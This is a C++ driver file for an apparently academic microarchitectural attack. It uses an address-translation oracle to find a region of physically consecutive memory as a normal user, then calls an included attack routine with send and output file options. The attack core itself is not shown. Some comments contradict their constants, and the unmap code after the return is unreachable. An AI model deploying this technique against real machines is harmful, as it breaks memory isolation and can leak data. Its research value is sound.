#include <cassert>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h> // mmap
#include <unistd.h>

#include "core-config.hpp"
#include "pretty-print.hpp"
#include "translation-oracle.hpp"
#include "utils.h"

/**
 * Tests if two virtual addresses are physically consecutive
 */
int is_physically_consecutive(void *virtual_1, void *virtual_2,
                              uint64_t page_size) {
  uint64_t physical_1 = (uint64_t)utils_get_physical_address((size_t)virtual_1);
  uint64_t physical_2 = (uint64_t)utils_get_physical_address((size_t)virtual_2);

  // printf("virt1: %p, virt2: %p\n", virtual_1, virtual_2);
  // printf("phys1: %p, phys2: %p\n", physical_1, physical_2);

  return physical_2 == (physical_1 + page_size);
}

/**
 * @brief Tests if the memory region is consecutive
 *
 * @param mem
 * @param pattern_length
 * @param page_size
 * @return True if all consecutive or False otherwise

*/
int is_consecutive(void *mem, uint64_t pattern_length, uint64_t page_size) {
  int consecutive_ctr = 1;
  int required_pages = (pattern_length) / page_size;
  for (size_t i = 0; i < required_pages - 1; ++i) {
    void *current_address = mem + i * page_size;
    int has_consecutive_successor = is_physically_consecutive(
        current_address, current_address + page_size, page_size);
    if (!has_consecutive_successor) {
      // printf("Address: %p\n", current_address);
      std::cout << TAG_FAIL << "Found " << consecutive_ctr << "/"
                << required_pages << " consecutive pages" << std::endl;
      return 0;
    }
    consecutive_ctr++;
  }
  std::cout << TAG_OK << "Found " << std::setfill(' ') << std::setw(6)
            << consecutive_ctr << " consecutive pages" << std::endl;
  return 1;
}

/**
 * @brief Searches for consecutive memory regions and prints the result
 *
 * @param mem
 * @param mapping_length
 * @param page_size
 */
void search_consecutive(void *mem, uint64_t mapping_length,
                        uint64_t page_size) {
  int consecutive_ctr = 1;
  void *start = mem;

  for (size_t i = 0; i < (mapping_length - 1) / page_size; ++i) {
    void *current_address = mem + i * page_size;
    int has_consecutive_successor = is_physically_consecutive(
        current_address, current_address + page_size, page_size);
    if (!has_consecutive_successor) {
      if (consecutive_ctr > 100) {
        std::cout << TAG_OK << "Found " << std::setfill(' ') << std::setw(6)
                  << consecutive_ctr << " cons. pages: " << start << " - "
                  << current_address << std::endl;
      }
      start = current_address + page_size;
      consecutive_ctr = 1;
    } else {
      consecutive_ctr++;
    }
  }
  std::cout << TAG_OK << "Found " << std::setfill(' ') << std::setw(6)
            << consecutive_ctr << " cons. pages: " << start << std::endl;
}

/**
 * @brief Heuristic to find a memory region that is likely to be consecutive
 *
 * @param mem The start of the memory region
 * @param mapping_length The length of the memory region in bytes
 * @param page_size The page size in bytes
 * @param needed_memory Needed amout of memory in bytes
 * @return Pointer to the start of the memory region
 */
void *memory_heuristic(void *mem, uint64_t mapping_length, uint64_t page_size,
                       uint64_t needed_memory) {
  return mem + mapping_length - (0x1 << 8) * page_size - needed_memory;
}

void *memory_heuristic2(void *mem, uint64_t mapping_length, uint64_t page_size,
                        uint64_t needed_memory) {
  u_int64_t aligned_end =
      ((uint64_t)mem + mapping_length - needed_memory) >> 24 << 24;
  return (void *)aligned_end;
}

#if !defined(DEBUG) && defined(DEBUG_FAST_MODE)
#error "DEBUG_FAST_MODE -> DEBUG"
#endif
#if !defined(DEBUG) && defined(DEBUG_SUPER_FAST_MODE)
#error "DEBUG_SUPER_FAST_MODE -> DEBUG"
#endif
#if !defined(DEBUG) && defined(DEBUG_ULTRA_FAST_MODE)
#error "DEBUG_ULTRA_FAST_MODE -> DEBUG"
#endif

TranslationOracle *oracle;

// Define the parameters
uint64_t mapping_length = 2100UL << 20; // 1GB
uint64_t page_size = 0x1UL << 12;       // 4KB
uint64_t pattern_length = 25 << 20;     // in bytes
uint64_t available_memory = 16UL << 30; // 8GB

CoreConfig core_config = CoreConfig(6);

void *framework_virt_to_phys(size_t virt) {
#if defined(DEBUG_SUPER_FAST_MODE) || defined(DEBUG_ULTRA_FAST_MODE)
  // NOTE: this is good for debugging, use -DDEBUG_SUPER_FAST_MODE
  // -DDEBUG_FAST_MODE then its fast but still everything is executed we found
  // the pin_to_core bug like that then just comment out stuff in oracle for
  // example and see if it then works oracle->oracle((void*)virt,
  // pattern_length);
  return (void *)utils_get_physical_address(virt);
#else
  return oracle->oracle((void *)virt, pattern_length);
#endif
}

#include "attack.c"

int main(int argc, char *argv[]) {
#ifdef DEBUG
  if (geteuid()) {
    std::cout << TAG_FAIL << "Running as root?\n";
    exit(1);
  }
#else
  if (!geteuid()) {
    std::cout << TAG_FAIL << "No debug mode. You can run as normal user.\n";
    exit(1);
  }
#endif

  // Create the oracle to translate virtual to physical addresses
  oracle = new TranslationOracle(core_config, available_memory);

  // Map the test memory
  void *mem = mmap(0, mapping_length, PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, 0, 0);
  memset(mem, 1, mapping_length);

  // Search for consecutive memory region
#if defined(DEBUG) && !defined(DEBUG_SUPER_FAST_MODE) &&                       \
    !defined(DEBUG_ULTRA_FAST_MODE)
#endif
  void *memory_candidate =
      memory_heuristic2(mem, mapping_length, page_size, pattern_length);
  std::cout << TAG_OK << "Memory candidate: " << memory_candidate << std::endl;

#if defined(DEBUG) && !defined(DEBUG_ULTRA_FAST_MODE)
  // Test if the memory region is consecutive
  if (is_consecutive(memory_candidate, pattern_length, page_size)) {
#endif
    // Translate the virtual address to a physical address
    void *physical_address = framework_virt_to_phys((uint64_t)memory_candidate);

    void *real_physical_address = 0;
#ifdef DEBUG
    real_physical_address =
        (void *)utils_get_physical_address((size_t)memory_candidate);
    assert(physical_address == real_physical_address);
#ifndef DEBUG_ULTRA_FAST_MODE
    void *real_physical_address2 =
        (void *)utils_get_physical_address((size_t)memory_candidate + 0x40100);
    assert(physical_address + 0x40100 == real_physical_address2);
    real_physical_address2 =
        (void *)utils_get_physical_address((size_t)memory_candidate + 0x00100);
    assert(physical_address + 0x0100 == real_physical_address2);
    real_physical_address2 =
        (void *)utils_get_physical_address((size_t)memory_candidate + 0x2a000);
    assert(physical_address + 0x2a000 == real_physical_address2);
    printf("everything verified\n");
#endif
#endif
    printf("virt: %p, phys: %p real_phys: %p\n", memory_candidate,
           physical_address, real_physical_address);

    char *sendfile = 0;
    char *outfile = 0;
    int nbytes = 0;
    for (int i = 1; i < argc; i++) {
      if (!strcmp(argv[i], "--sendfile") && (i + 1) < argc)
        sendfile = argv[i + 1];

      if (!strcmp(argv[i], "--outfile") && (i + 1) < argc)
        outfile = argv[i + 1];
      if (!strcmp(argv[i], "--nbytes") && (i + 1) < argc)
        nbytes = atoi(argv[i + 1]);
    }
    attack(sendfile, outfile, nbytes, memory_candidate, pattern_length,
           physical_address);

#if defined(DEBUG) && !defined(DEBUG_ULTRA_FAST_MODE)
  } else {
    std::cout << TAG_FAIL << "Not enough consecutive memory :/" << std::endl;
  }
#endif

  return 0;

  // Unmap the test memory
  int unmap_success = munmap(mem, mapping_length);
  if (unmap_success == 0) {
    std::cout << TAG_OK << "Unmapping successful" << std::endl;
  } else {
    std::cout << TAG_FAIL << "Unmapping Error" << std::endl;
  }

  return 0;
}
